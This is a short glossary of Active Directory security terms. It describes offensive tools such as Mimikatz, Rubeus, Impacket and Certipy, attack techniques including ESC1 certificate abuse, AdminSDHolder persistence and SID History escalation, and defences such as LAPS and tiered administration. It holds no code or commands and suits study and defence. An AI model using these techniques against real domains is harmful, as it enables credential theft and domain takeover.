**Rubeus** — A C# Kerberos toolkit for Windows. Used for Kerberoasting, AS-REP roasting, ticket manipulation, and S4U delegation abuse.

**Mimikatz** — A credential extraction tool for Windows. Dumps passwords, hashes, and Kerberos tickets from memory. Used for Golden/Silver Ticket forging.

**Impacket** — A Python library with standalone scripts for SMB, Kerberos, LDAP, and AD attacks. Runs on Linux/WSL2. Includes secretsdump, GetUserSPNs, GetNPUsers, psexec, wmiexec, and many others.

**Certipy** — A Python tool for attacking Active Directory Certificate Services (AD CS). Identifies and exploits ESC1-ESC8+ template misconfigurations.

**AD CS (Active Directory Certificate Services)** — Microsoft's PKI implementation. Issues digital certificates. Misconfigured certificate templates (ESC vulnerabilities) allow privilege escalation to Domain Admin.

**ESC1** — AD CS misconfiguration where a certificate template allows the requestor to specify an arbitrary Subject Alternative Name. Allows impersonating any user including Domain Admin.

**LAPS (Local Administrator Password Solution)** — A Microsoft tool that randomises local admin passwords on domain-joined machines, preventing lateral movement via shared local admin credentials.

**Protected Users** — An AD security group that enforces strict authentication constraints: no NTLM, no RC4, no credential caching, 4-hour TGT lifetime.

**AdminSDHolder** — A protected AD object whose ACL propagates to all privileged group members every 60 minutes. Modifying its ACL creates persistent permissions that survive group membership changes.

**SID History** — An attribute on AD accounts that stores previous SIDs (from domain migrations). Abused for privilege escalation across domain and forest boundaries.

**Tiered Administration** — An AD security model that separates administrative accounts into Tier 0 (DCs/AD), Tier 1 (servers), and Tier 2 (workstations) to prevent credential exposure across tiers.
